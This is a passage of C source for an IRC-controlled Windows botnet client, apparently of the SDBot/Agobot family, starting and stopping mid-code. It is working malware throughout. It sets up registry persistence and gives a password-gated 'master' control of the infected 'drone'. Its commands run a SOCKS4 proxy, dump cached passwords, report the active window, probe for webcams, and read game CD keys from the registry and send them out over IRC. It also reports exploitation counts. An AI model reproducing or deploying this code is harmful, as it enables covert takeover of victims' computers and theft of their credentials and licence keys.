		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {	//Disconnect (sleep 30 mins, reconnect..)
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;	//Quit
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }
 
void writekeys(void)
{
	char filename1[64];
	strncpy(filename1, filename, sizeof(filename1)-1);
	
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1);
	RegCloseKey(key); 

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, servicekey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1); 
	RegCloseKey(key); 
 
	RegCreateKeyEx(HKEY_CURRENT_USER, runkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1);
	RegCloseKey(key); 
}

 #ifndef NO_IDENT
// ident server
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin;
	char user[12];
	char buff[500];

	isock = socket(AF_INET, SOCK_STREAM, 0); // set isock to standard TCP socket
	memset(&issin, 0, sizeof(issin));
	issin.sin_addr.s_addr=INADDR_ANY;
	issin.sin_family = AF_INET; // AF_INET is currently the only supported family
	issin.sin_port = htons(113); // set ident port
	bind(isock, (SOCKADDR *)&issin, sizeof(issin)); // bind issin to isock
	listen(isock,5);
	csock=accept(isock,0,0);
	if (csock==INVALID_SOCKET) return 0;
	closesocket(isock);
	if (recv(csock,buff,sizeof(buff),0)==SOCKET_ERROR) return 0;
	Split(buff,0);
	memset(user, 0, sizeof(user));
	rndnick(user);
	strcat(buff," : USERID : UNIX : ");
	strcat(buff,user);
	strcat(buff,"\r\n");
	send(csock,buff,strlen(buff),0);
	// we're done, so let's close our sockets and return
	closesocket(csock);
	return 0;
 }
 #endif

 char * rndnick(char *strbuf)
 {
    int i;

    srand(GetTickCount());
    sprintf(strbuf, "%s", nickconst);
    for (i=1; i<=maxrand; i++) sprintf(strbuf, "%s%i", strbuf, rand()%10);
    return strbuf;
 }

// receive loop for bots/spies
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
 {
	// main receive buffer
	char buff[4096];
	int err, repeat;
	char master[128*maxlogins];
	char str[8];
	char login[64];
	int in_channel=0;

	memset(master, 0, sizeof(master));


	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	
	//
	//Fixed the nick problem, lol i just used the original - Im just so l33t -  D3ADLiN3
	//
	srand(GetTickCount());
 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n",nick1, rndnick(str), nick1);
				   //"USER x 0 0 :%s\r\n", rndnick(str), nick1);
	//
	//
	//
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		char host[160];
		char *lines[MAX_LINES];
		int i,j;


		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if ((err == 0) || (err == SOCKET_ERROR)) break;

		// split lines up if multiple lines received at once, and parse each line

		
		i=Split(buff,&lines);
		for (j=0;j<i;j++) {
			repeat=1;
			do {
				repeat=irc_parseline(lines[j], sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
				repeat--;
			} while (repeat>0);
			if (repeat==-1) return 0;	//Reconnect
			else if (repeat==-2) return 1;	//Disconnect
			else if (repeat==-3) return 2;	//Quit
		}

	}

	return 0;
 }

// function to parse lines for the bot and clones
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
 {
	char line1[512];
	char line2[512];
	char *masters[maxlogins];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[512];
	unsigned char parmenters[256];
	char msg_real_dest[256];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;

    
	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);
	for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;

   silent=FALSE;   //silent by default :) 
   //check for 'silent' parameter 

   memset(parmenters,0,sizeof(parmenters)); 

   for (i=31;i>=0;i--) { 
      if (!a[i]) continue; 
      if ((a[i][0]=='-') && (a[i][2]==0)) { 
         //Looks like a valid parmenter.. 
         parmenters[a[i][1]]=1; 
         a[i][0]=0; 
         a[i][1]=0; 
         a[i][2]=0; 
         a[i]=NULL; 
      } else break; 
   } 

   if (parmenters['s']) silent=TRUE; 
   if (parmenters['n']) { 
      silent=FALSE; 
      notice=TRUE; 
   }
	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		if (*in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendf2(sock, "COIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		//on join user mode
		for (int u=0; usermodes[u]!=NULL; u++){
	
			irc_sendf2(sock,"MODE %s %s\r\n",nick1,usermodes[u]);
			}
		//on join channel mode
		for (int c=0; chanmodes[c]!=NULL; c++){
			irc_sendf2(sock,"MODE %s %s\r\n",channel, chanmodes[c]);
		}
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use   - 
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1);
		irc_sendf(sock, "NICK jnx%s\r\n", nick1);
		return 1;
	}


	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) {
		if (strcmp(masters[i], a0) == 0) {
			ismaster = TRUE;
		}
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"User %s logged out", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}


	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		for (i=0;i<maxlogins;i++) {
			if (strcmp(masters[i],a0)==0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if (oldnck != NULL && newnck != NULL)  {
			if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		}
		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "User %s logged out", user);
		addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "Joined channel %s", a[4]);
		addlog(sendbuf);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			strcpy(msg_real_dest,a[2]);
			if (strstr(a[2], "#") == NULL || notice) a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (strncmp(nick, a[3], strlen(nick)) == 0) s = 4; else s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in

	if (strcmp(login_cmd, a[s]) == 0)
		{
		if (a[s+1] == NULL) return 1;
		if (nopm){
		if (ismaster || strstr(a[2], "#") == NULL) return 1;
		}

		char *u = strtok(a[0], "!") + 1;
		char *h = strtok(NULL, "\0");

		if (strcmp(password, a[s+1]) != 0)
			{
			irc_sendf(sock, "NOTICE %s :Wrong Fucking password. The Bitch Logs.\r\n", user);
			sprintf(sendbuf, "Failed login by %s (%s)", u, h);
			addlog(sendbuf);
			return 1;
			}
		if (!HostMaskMatch(h))
			{
			irc_sendf(sock, "NOTICE %s :Wrong Host Bitch. Your Trying To Steal My Bot!!!Bitch.\r\n", user);
			sprintf(sendbuf, "Failed login by %s (%s)", u, h);
			addlog(sendbuf);
			return 1;
			}
		for(i = 0; i < maxlogins; i++)
			{
			if (a[s+1] == NULL) return 1;
			if (masters[i][0] != '\0') continue;
			if (strcmp(password, a[s+1]) == 0)
				{
				strncpy(masters[i],  a0, 127);
				if (!silent) irc_privmsg(sock, a[2], "Your Now Infected Biatch!!!", notice);
				sprintf(sendbuf, "User %s (%s) logged in", u, h);
				addlog(sendbuf);
				break;
				}
			}
		return 1;
		}
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix1 || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp(rndnick_cmd[0], a[s]) == 0 || strcmp(rndnick_cmd[1], a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp(gennick_cmd, a[s]) == 0){
				generatenick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp(uptimenick_cmd, a[s]) == 0){
				nick1 = rndnick(nick);
				DWORD uptime;
				uptime=GetTickCount();
				if (uptime > 864000000) {
					strncpy(nick1,"[10]", 4);
					if (uptime > 1296000000) {	
						strncpy(nick1,"[15]", 4);
						if (uptime > 1728000000) {
							strncpy(nick1,"[20]", 4);
							if (uptime > 2592000000) {
								strncpy(nick1,"[30]", 4);
							}
						}
					}
				}
				nick1 = rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick1);
			}
			else if (strcmp(die_cmd[0], a[s]) == 0 || strcmp(die_cmd[1], a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp(logout_cmd[0], a[s]) == 0 || strcmp(logout_cmd[1], a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "User %s logged out.\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}
			#ifndef NO_BOTVERSION
			else if (strcmp(version_cmd[0], a[s]) == 0 || strcmp(version_cmd[1], a[s]) == 0) {
				sprintf(sendbuf, bversion);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
			#ifndef NO_SECURE
			else if (strcmp(secure_cmd[0], a[s]) == 0 || strcmp(secure_cmd[1], a[s]) == 0) {
				// by Edge & ex0r, ex0rHACK-v04, enjoy :P~~~
				// Set EnableDCOM to "N" (Gutted from AgoBot >:))
				HKEY hkey=NULL; 
				DWORD dwSize=128; 
				char szDataBuf[128];
				strcpy(szDataBuf, "N"); 
				dwSize=strlen(szDataBuf);
				LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
				RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
				RegCloseKey(hkey);

				HANDLE f;
				DWORD r;
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				char cmdline[256];
				char tcmdline[256];
				char cfilename[256];
				char batfile[256];
				GetTempPath(sizeof(tempdir), tempdir);
				sprintf(batfile, "%s\\secure.bat", tempdir);
				f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
				if (f > (HANDLE)0) {
				// Write a batch file to remove NT Network Shares.
				WriteFile(f, "@echo off\r\n"
								"net share C$ /delete /y\r\n"
								"net share D$ /delete /y\r\n"
								"net share IPC$ /delete /y\r\n"
								"net share ADMIN$ /delete /y\r\n", 115, &r, NULL); // No idea why 115, 105 was creating some funky shit ;x
				CloseHandle(f);

				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.wShowWindow = SW_HIDE;

				GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
				sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
				ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

				// Execute the batch file
				CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
				}
				if (!silent) {
					irc_privmsg(sock, a[2], "Drone Secured", notice);
				}
			}
			#endif
			#ifndef NO_SOCK4SERV
				else if (strcmp(sock_cmd, a[s]) == 0) {
					CreateThread(NULL, 0, &SocksDaemon, NULL, 0, &id);
					addthread("Sock4");
					sprintf(sendbuf, "socks4 daemon started on port %d .\r\n", sock4port);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			#endif
			
			else if (strcmp("restrict", a[s]) == 0) {
				HKEY hKey;
				DWORD dwData;
				if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Contol\\Lsa", 0, KEY_ALL_ACCESS, &hKey) != 0) return 1;
				dwData = 0x00000001;
				RegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD));
				RegCloseKey(hKey);
				irc_privmsg(sock, a[2], "Restricted NULL access to the IPC$ Share.", notice);
			}
			
			
			else if (strcmp(reconnect_cmd[0], a[s]) == 0 || strcmp(reconnect_cmd[1], a[s]) == 0) {
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp(disconnect_cmd[0], a[s]) == 0 || strcmp(disconnect_cmd[1], a[s]) == 0) {
				irc_send(sock, "QUIT :later");
				return -1;
			}
			else if (strcmp(quit_cmd[0], a[s]) == 0 || strcmp(quit_cmd[1], a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :later\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp(mirccmd_cmd[0], a[s]) == 0 || strcmp(mirccmd_cmd[1], a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
                if (y != NULL) mirccmd(y);
                }
			}
			else if (strcmp(status_cmd[0], a[s]) == 0 || strcmp(status_cmd[1], a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000) - started;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, "PRIVMSG %s :Drone Ready. Up %dd %dh %dm.\r\n",a[2] , days, hours, minutes);
			//	irc_privmsg(sock, a[2], sendbuf, notice);
				send(sock, sendbuf, strlen(sendbuf), 0);
			}
			else if (strcmp(id_cmd[0], a[s]) == 0 || strcmp(id_cmd[1], a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			
			else if (strcmp(threads_cmd[0], a[s]) == 0 || strcmp(threads_cmd[1], a[s]) == 0) {
				irc_privmsg(sock, a[2], "[\2SD Threads\2]", notice);
				for (i = 0; i < 64; i++) {
					if (threadd[i][0] != '\0') {
						sprintf(sendbuf, "%d: %s", i, threadd[i]);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				
				irc_privmsg(sock, a[2], "[\2SPY Threads\2]", notice);
				for (i=0;i <= 40;i++) {
					if (threds[i].id != 0) {
					sprintf(sendbuf,"%i: %s \r\n",i,threds[i].name);
					irc_privmsg(sock,a[2],sendbuf,notice);
					}
				}	
			}
			else if (strcmp(aliases_cmd[0], a[s]) == 0 || strcmp(aliases_cmd[1], a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[alias list]-", notice);
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp(log_cmd, a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}


			#ifndef NO_NETINFO
			else if (strcmp(netinfo_cmd[0], a[s]) == 0 || strcmp(netinfo_cmd[1], a[s]) == 0) irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp(sysinfo_cmd[0], a[s]) == 0 || strcmp(sysinfo_cmd[1], a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf), notice);
			#endif
			else if (strcmp(remove_cmd[0], a[s]) == 0 || strcmp(remove_cmd[1], a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "Removing bot...", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			else if (strcmp(ntdel_cmd,a[s])==0) {
				DeleteFile("payload.dat");
				if (!silent) irc_privmsg(sock,a[2],"Removed payload.dat",notice);
			}
			else if (strcmp(ntstats_cmd,a[s])==0) {
				if (!silent) {
					DWORD total, days, hours, minutes;
				    total = (GetTickCount() / 1000) - started;
					days = total / 86400;
					hours = (total % 86400) / 3600;
					minutes = ((total % 86400) % 3600) / 60;6400;
					sprintf(sendbuf, "[Stats] - NT-Pass: Exploited %d IP's in %ddays %dhours %dminutes", ntstats, days, hours, minutes);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}
			else if (strcmp(activewindow_cmd[0],a[s])==0 || strcmp(activewindow_cmd[1], a[s]) == 0) {
			char WndTxt[1024];
			if (GetWindowText(GetForegroundWindow(), WndTxt, sizeof(WndTxt)) > 0)
			{
				sprintf(sendbuf, "Active window: %s.\r\n",WndTxt);
				irc_privmsg(sock, a[2], sendbuf, notice);
				//irc_send(sock, sendbuf);
				//irc_privmsg(sock, sendbuf, lstrlen(sendbuf), 0);
			}
		}
			else if (strcmp(passwords_cmd[0],a[s]) == 0 || strcmp(passwords_cmd[1],a[s])==0 ){
				if (cashedpasswords(sock,a[2]) == 0) 
					sprintf(sendbuf,"[CachedPass] Done");
				else
					sprintf(sendbuf,"[CachedPass] Not Using Win9x!");

					irc_privmsg(sock, a[2], sendbuf, notice);
				}
/* Old one
			else if (strcmp(passwords_cmd[0],a[s]) == 0 || strcmp(passwords_cmd[1],a[s])==0 ){
				HMODULE hLib=LoadLibrary("MPR.DLL");
				PASSCACHECALLBACK_DATA dat;
				dat.pBuffer=(char *)malloc(65536);
				dat.nBufLen=65536;
				dat.nBufPos=0;
				pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");
				if (!pWNetEnumCachedPasswords)	{ //win 9x
					FreeLibrary(hLib);
					sprintf(sendbuf,"[Cached Passwords] Not using WIN9X");
					irc_privmsg(sock, a[2], sendbuf, notice);
					return 1;
				}
				pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);
				char *svStr;
				svStr=dat.pBuffer;
				sprintf(sendbuf,"[Cached Passwords] Searching... ");
				irc_privmsg(sock, a[2], sendbuf, notice);
				do {
				char *svRsc=svStr;
				svStr+=lstrlen(svStr)+1;
				char *svPwd=svStr;
				svStr+=lstrlen(svStr)+1;
				memset(sendbuf,0,sizeof(sendbuf));
				sprintf(sendbuf,"%s %s\n\r", svRsc, svPwd);
				irc_privmsg(sock, a[2], sendbuf, notice);
				Sleep(2500);
			}while(*svStr!='\0');
			FreeLibrary(hLib);
			return 0;
			}
*/
			if (strcmp(driver_cmd,a[s]) == 0)
			{
				char svName[256];
				char svComment[512];
				int i;

				for (i=0;i<10;i++) {
					if(capGetDriverDescription(i, svName, 255, svComment, 511)) {
						sprintf(sendbuf, "Capture driver %s - %s.\r\n", i, svName, svComment);
						irc_privmsg(sock, a[2], sendbuf, notice);
						//send(sock, buffer, lstrlen(buffer), 0);
					}
				}
			}
			else if (strcmp(hascam_cmd,a[s]) == 0)
			{
			
			int v;
			char svName[256];
			char svComment[512];
			for (v=0;v<10;v++) {
				if(capGetDriverDescription(v, svName, 255, svComment, 511)) {
					cam = TRUE;
				}
			}
			if (cam == TRUE){
			sprintf(sendbuf,"J'ai une webcam dude");
			irc_privmsg(sock,a[2],sendbuf,notice);
			
			}
			if (cam == FALSE){ 
			sprintf(sendbuf,"Je n'ai pas de webcam dude");
			irc_privmsg(sock,a[2],sendbuf,notice);
			
			}
			}

			else if (strcmp(getcdkey_cmd[0], a[s]) == 0 || strcmp(getcdkey_cmd[1], a[s]) == 0) {
				// Half-Life CDKey
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", 0, KEY_READ, &hkey);
				DWORD dwSize = 128;
				unsigned char szDataBuf[128];
				if(RegQueryValueEx(hkey, "Key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				                sprintf(sendbuf, "Found Half-Life CDKey (%s).\r\n", szDataBuf);
				                irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
				 
				// UTKEY
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Unreal Technology\\Installed Apps\\UT2003", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Unreal Tournament 2003 CDKey (%s).\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
   
				// CSKEY
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Valve\\CounterStrike\\Settings", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Counter-Strike ( Retail ) CDKey (%s).\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// IGI2
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\IGI 2 Retail", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Project IGI 2 CDKey (%s).\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// BATTLEFIELD
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "ergc", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Battlefield 1942 CDKey (%s).\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// BATTLEFIELD ROAD TO ROME
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "ergc", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Found Battlefield 1942 Road To Rome CDKey (%s).\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// RavenShield
				dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Red Storm Entertainment\\RAVENSHIELD", 0, KEY_READ, &hkey);
				if(RegQueryValueEx(hkey, "CDKey", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
				 sprintf(sendbuf, "Rainbow Six III RavenShield CDKey (%s).\r\n", szDataBuf);
				 irc_privmsg(sock, a[2], sendbuf, notice); }
				RegCloseKey(hkey);
 
				// Neverwinter Nights CDKey

				FILE *fp; char line[100]; dwSize = 128; 
				lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter", 0, KEY_READ, &hkey);
				dwSize=1024;
				unsigned char szDataBuf2[1024];
